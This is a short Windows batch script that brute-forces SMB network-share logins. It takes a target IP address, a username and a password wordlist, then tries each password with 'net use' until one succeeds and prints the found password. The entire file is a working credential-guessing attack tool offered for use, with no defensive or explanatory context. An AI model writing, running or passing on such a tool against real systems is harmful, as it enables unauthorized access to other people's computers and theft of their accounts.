@echo off
title %~n0.bat
color A
chcp 65001 >nul 2>&1

:loop
cls
echo.
set /p ip="Enter Local IP Address »  "
set /p user="Enter UserName »  "
set /p wordlist="Enter Password List »  "

set /a count=1
for /f %%a in (%wordlist%) do (
set pass=%%a
call :attempt
)
echo Password Not Found!
pause >nul 2>&1
goto :loop

:success
net use \\%ip% /d /y >nul 2>&1
echo Password Found!: %pass%
pause >nul 2>&1
goto :loop

echo.
:attempt
net use \\%ip% /user:"%user%" %pass% >nul 2>&1
echo [%pass%] [%count%]
if %errorlevel% EQU 0 goto :success
set /a count=%count%+1